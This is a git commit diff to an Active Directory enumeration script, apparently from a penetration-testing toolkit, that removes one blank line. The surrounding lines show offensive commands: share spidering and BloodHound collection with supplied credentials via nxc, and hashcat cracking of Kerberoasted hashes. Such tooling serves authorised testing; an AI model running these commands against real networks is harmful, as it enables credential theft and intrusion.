ae6d590a991c3c7fafca6f58a88b57cb6ba27814
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2024-11-26 16:24:24 +0000

    Update enumeratead.sh

--- enumeration/infra/ad/enumeratead.sh
+++ enumeration/infra/ad/enumeratead.sh
@@ -73,7 +73,6 @@ nxc smb $target -u "$username" -p "$password" -M spider_plus
 echo "Run Bloodhound Ingester"
 nxc ldap $target -u "$username" -p "$password" --bloodhound --collection ALL
 
-
 echo "Start Cracking Kerberoastable Hashes"
 hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt -O
 
